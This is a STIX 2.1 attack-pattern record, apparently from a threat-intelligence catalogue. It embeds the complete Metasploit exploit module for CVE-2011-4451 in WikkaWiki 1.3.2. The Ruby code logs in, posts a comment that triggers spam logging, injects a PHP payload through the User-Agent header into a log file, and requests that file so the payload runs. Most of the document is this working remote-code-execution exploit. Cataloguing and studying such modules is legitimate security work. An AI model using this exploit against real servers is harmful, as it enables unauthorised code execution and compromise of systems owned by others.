{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3ecb62f4-8c23-4ba5-bbb0-f64cb8ee9478",
    "created": "2024-08-14T17:07:38.392473Z",
    "modified": "2024-08-14T17:07:38.392477Z",
    "name": "\"WikkaWiki 1.3.2 Spam Logging PHP Injection\"",
    "description": " This module exploits a vulnerability found in WikkaWiki.  When the spam logging feature is enabled, it is possible to inject PHP code into the spam log file via the UserAgent header, and then request it to execute our payload.  There are at least three different ways to trigger spam protection, this module does so by generating",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/wikka_spam_exec.rb",
            "external_id": "wikka_spam_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-4451"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"WikkaWiki 1.3.2 Spam Logging PHP Injection\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in WikkaWiki.  When the spam logging\n        feature is enabled, it is possible to inject PHP code into the spam log file via the\n        UserAgent header, and then request it to execute our payload.  There are at least\n        three different ways to trigger spam protection, this module does so by generating\n        10 fake URLs in a comment (by default, the max_new_comment_urls parameter is 6).\n\n          Please note that in order to use the injection, you must manually pick a page\n        first that allows you to add a comment, and then set it as 'PAGE'.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'EgiX',   #Initial discovery, PoC\n          'sinn3r'  #Metasploit\n        ],\n      'References'     =>\n        [\n          ['CVE', '2011-4451'],\n          ['OSVDB', '77393'],\n          ['EDB', '18177']\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\"\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Arch'           => ARCH_PHP,\n      'Platform'       => ['php'],\n      'Targets'        =>\n        [\n          ['WikkaWiki 1.3.2 r1814', {}]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-11-30',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('USERNAME',  [true, 'WikkaWiki username']),\n        OptString.new('PASSWORD',  [true, 'WikkaWiki password']),\n        OptString.new('PAGE',      [true, 'Page to inject']),\n        OptString.new('TARGETURI', [true, 'The URI path to WikkaWiki', '/wikka/'])\n      ])\n  end\n\n\n  def check\n    uri = normalize_uri(target_uri.path)\n    res = send_request_raw({\n      'method' => 'GET',\n      'uri'    => \"#{uri}/wikka.php?wakka=HomePage\"\n    })\n\n    if res and res.body =~ /Powered by WikkaWiki/\n      return Exploit::CheckCode::Detected\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n\n  #\n  # Get the cookie before we do any of that login/exploity stuff\n  #\n  def get_cookie\n    res = send_request_raw({\n      'method' => 'GET',\n      'uri'    => normalize_uri(@base, \"wikka.php\")\n    })\n\n    # Get the cookie in this format:\n    # 96522b217a86eca82f6d72ef88c4c7f4=pr5sfcofh5848vnc2sm912ean2; path=/wikka\n    if res and !res.get_cookies.empty?\n      cookie = res.get_cookies\n    else\n      fail_with(Failure::Unknown, \"#{peer} - No cookie found, will not continue\")\n    end\n\n    cookie\n  end\n\n\n  #\n  # Do login, and then return the cookie that contains our credential\n  #\n  def login(cookie)\n    # Send a request to the login page so we can obtain some hidden values needed for login\n    uri = normalize_uri(@base, \"wikka.php\") + \"?wakka=UserSettings\"\n    res = send_request_raw({\n      'method'  => 'GET',\n      'uri'     => uri,\n      'cookie'  => cookie\n    })\n\n    # Extract the hidden fields\n    login = {}\n    if res and res.body =~ /\\<div id\\=\\\"content\\\"\\>.+\\<fieldset class\\=\\\"hidden\\\"\\>(.+)\\<\\/fieldset\\>.+\\<legend\\>Login\\/Register\\<\\/legend\\>/m\n      fields = $1.scan(/\\<input type\\=\\\"hidden\\\" name\\=\\\"(\\w+)\\\" value\\=\\\"(\\w+)\\\" \\/>/)\n      fields.each do |name, value|\n        login[name] = value\n      end\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Unable to find the hidden fieldset required for login\")\n    end\n\n    # Add the rest of fields required for login\n    login['action']       = 'login'\n    login['name']         = datastore['USERNAME']\n    login['password']     = datastore['PASSWORD']\n    login['do_redirect']  = 'on'\n    login['submit']       = \"Login\"\n    login['confpassword'] = ''\n    login['email']        = ''\n\n    port = (rport.to_i == 80) ? \"\" : \":#{rport}\"\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => uri,\n      'cookie'    => cookie,\n      'headers'   => { 'Referer' => \"http://#{rhost}#{port}#{uri}\" },\n      'vars_post' => login\n    })\n\n    if res and res.get_cookies =~ /user_name/\n      c = res.get_cookies\n      user = c.scan(/(user_name\\@\\w+=\\w+);/)[0] || \"\"\n      pass = c.scan(/(pass\\@\\w+=\\w+)/)[0] || \"\"\n      cookie_cred = \"#{cookie}; #{user}; #{pass}\"\n    else\n      cred = \"#{datastore['USERNAME']}:#{datastore['PASSWORD']}\"\n      fail_with(Failure::Unknown, \"#{peer} - Unable to login with \\\"#{cred}\\\"\")\n    end\n\n    return cookie_cred\n  end\n\n\n  #\n  # After login, we inject the PHP payload\n  #\n  def inject_exec(cookie)\n    # Get the necessary fields in order to post a comment\n    res = send_request_raw({\n      'method' => 'GET',\n      'uri'    => normalize_uri(@base, \"wikka.php\") + \"?wakka=#{datastore['PAGE']}&show_comments=1\",\n      'cookie' => cookie\n    })\n\n    fields = {}\n    if res and res.body =~ /\\<form action\\=.+processcomment.+\\<fieldset class\\=\\\"hidden\\\"\\>(.+)\\<\\/fieldset\\>/m\n      $1.scan(/\\<input type\\=\\\"hidden\\\" name\\=\\\"(\\w+)\\\" value\\=\\\"(.+)\\\" \\/>/).each do |n, v|\n        fields[n] = v\n      end\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Cannot get necessary fields before posting a comment\")\n    end\n\n    # Generate enough URLs to trigger spam logging\n    urls = ''\n    10.times do |i|\n      urls << \"http://www.#{rand_text_alpha_lower(rand(10)+6)}.#{['com', 'org', 'us', 'info'].sample}\\n\"\n    end\n\n    # Add more fields\n    fields['body']   = urls\n    fields['submit'] = 'Add'\n\n    # Inject payload\n    b64_payload = Rex::Text.encode_base64(payload.encoded)\n    port = (rport.to_i == 80) ? \"\" : \":#{rport}\"\n    uri = normalize_uri(\"#{@base}wikka.php?wakka=#{datastore['PAGE']}/addcomment\")\n    post_data = \"\"\n    send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => uri,\n      'cookie'    => cookie,\n      'headers'   => { 'Referer' => \"http://#{rhost}:#{port}/#{uri}\" },\n      'vars_post' => fields,\n      'agent'     => \"<?php #{payload.encoded} ?>\"\n    })\n\n    send_request_raw({\n      'method' => 'GET',\n      'uri'    => normalize_uri(@base, \"spamlog.txt.php\")\n    })\n  end\n\n\n  def exploit\n    @base = normalize_uri(target_uri.path)\n    @base << '/' if @base[-1, 1] != '/'\n\n    print_status(\"Getting cookie\")\n    cookie = get_cookie\n\n    print_status(\"Logging in\")\n    cred = login(cookie)\n\n    print_status(\"Triggering spam logging\")\n    inject_exec(cred)\n\n    handler\n  end\nend\n\n\n=begin\nFor testing:\nsvn -r 1814 co https://wush.net/svn/wikka/trunk wikka\n\nOpen wikka.config.php, do:\n'spam_logging' => '1'\n=end\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2011-11-30",
    "x_mitre_platforms": [
        "['php']"
    ]
}